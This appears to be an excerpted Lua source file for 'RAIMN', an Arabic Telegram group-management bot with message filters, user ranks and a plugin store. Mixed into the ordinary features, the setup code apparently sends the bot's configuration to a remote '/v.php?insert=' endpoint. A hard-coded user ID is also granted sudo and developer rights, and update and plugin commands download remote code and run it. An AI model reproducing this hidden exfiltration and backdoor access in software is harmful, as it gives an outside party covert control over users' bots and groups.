...
https.request('/v.php?insert='..JSON.encode(saiedinfo))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("RAIMN", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/RAIMN
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./RAIMN.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S RAIMN -X kill
screen -S RAIMN ./RAIMN
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/TEAMRAIMN/Files_RAIMN/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1351515656,1351515656}   
...
if tonumber(user_id) == tonumber(1351515656) then  
var = true  
elseif tonumber(user_id) == tonumber(1351515656) then
var = true  
...
local RAIMN_Msg = ''  
if msgs < 100 then 
RAIMN_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
RAIMN_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
RAIMN_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
RAIMN_Msg = 'متفاعل' 
elseif msgs < 1200 then 
RAIMN_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
RAIMN_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
RAIMN_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
RAIMN_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
RAIMN_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
RAIMN_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
RAIMN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
RAIMN_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
RAIMN_Msg = 'رب التفاعل'  
end 
return RAIMN_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceRAIMN(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,RAIMN_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf RAIMN.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMRAIMN/RAIMN/master/RAIMN.lua')
send(msg.chat_id_, msg.id_,' ★∫ تم تحديث السورس \n ★∫ لديك اخر اصدار لسورس رايمن\n ★∫ الاصدار » { 1.3v}')
dofile('RAIMN.lua')  
end
if text == 'الاصدار ★' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ★∫ اصدار سورس رايمن \n ★∫ الاصدار »{ 1.3v}')
end
...
send(msg.chat_id_, msg.id_,'★∫  عدد الكروبات الان » { '..#group..' }'..RAIMNk..''..RAIMN..'\n★∫  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ★∫ العضو » ['..result.title_..'](t.me/'..(username or 'TEAMRAIMN')..')'
status  = '\n ★∫ تم ترقيته مطور'
...
usertext = '\n ★∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAMRAIMN')..')'
status  = '\n ★∫ تم ترقيته مطور'
...
local RAIMN1_Msg = database:get(bot_id.."RAIMN1:Add:Filter:Rp2"..text..msg.chat_id_)   
if RAIMN1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ★∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TEAMRAIMN')..') \n ★∫ '..RAIMN1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if RAIMN_Msg and not Special(msg) then  
local RAIMN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if RAIMN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ★∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ★∫ ["..RAIMN_Msg.."] \n")
else
send(msg.chat_id_,0," ★∫ العضو : {["..data.first_name_.."](T.ME/TEAMRAIMN)}\n ★∫ ["..RAIMN_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ★∫ عذرا » {["..data.first_name_.."](T.ME/TEAMRAIMN)}\n ★∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
🌐┇[RAIMN TEAM](T.ME/TEAMRAIMN)
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📊┇ [Source Channel](T.ME/TEAMRAIMN)

📋┇ [🌿RAIMN Dev](T.ME/AABSi)

📁┇ [Source  Files](T.Me/TEAM_RAIMN)

 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
📧┇ [TWS RAIMN](t.me/aabsi)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ★∫ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TEAMRAIMN')..') \n ★∫ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ★∫ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'TEAMRAIMN')..') \n ★∫ تـم قفـل التاك بالكتم ')
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TEAMRAIMN/Files_RAIMN/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ★∫ اهلا بك في متجر ملفات رايمن\n ★∫ ملفات السورس ↓\n≪━━━━━━━━━━━━━≫\n\n"
local TextE = "\n≪━━━━━━━━━━━━━≫\n ★∫ علامة تعني { ✓ } ملف مفعل\n ★∫ علامة تعني { ✘ } ملف معطل\n ★∫ قناة سورس رايمن ↓\n".." ★∫ [اضغط هنا لدخول](t.me/TEAMRAIMN) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/TEAMRAIMN/Files_RAIMN/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('RAIMN.lua')  
else
send(msg.chat_id_, msg.id_," ★∫ عذرا الملف لايدعم سورس رايمن \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ★∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAMRAIMN')..')'
status  = '\n ★∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ★∫ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ★∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAMRAIMN')..')'
...
database:set(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ★∫ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."RAIMN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."RAIMN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ★∫ تم منع الكلمه مع التحذير")  
database:del(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."RAIMN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."RAIMN1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."RAIMN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ★∫ ارسل الكلمه الان")  
database:set(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RAIMN1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."RAIMN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."RAIMN1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."RAIMN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RAIMN1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."RAIMN1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ★∫ قائمة المنع \n≪━━━━━━━━━━━━━≫\n"
for k,v in pairs(list) do  
local RAIMN_Msg = database:get(bot_id.."RAIMN1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..RAIMN_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ★∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'TEAMRAIMN')..')'..'\n ★∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'رايمن').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'رايمن')
local RAIMN_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..RAIMN_Msg[math.random(#RAIMN_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'رايمن').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'TEAMRAIMN')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
RAIMNdx(msg.chat_id_, msg.id_, ' ★∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n ★∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ★∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ★∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'رايمن')
...
RAIMN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(RAIMN)
...
--------------------------------------------------------------------------------------------------------------
SourceRAIMN(data.message_,data)
...
------------------------------------------------------------------------
local RAIMNAbot = database:get(bot_id.."RAIMN1:Add:Filter:Rp2"..text..result.chat_id_)   
if RAIMNAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ★∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ★∫ ["..RAIMNAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local RAIMN1_Msg = database:get(bot_id.."RAIMN1:Add:Filter:Rp2"..text..result.chat_id_)   
if RAIMN1_Msg then    
send(msg.chat_id_, msg.id_," ★∫ "..RAIMN1_Msg)
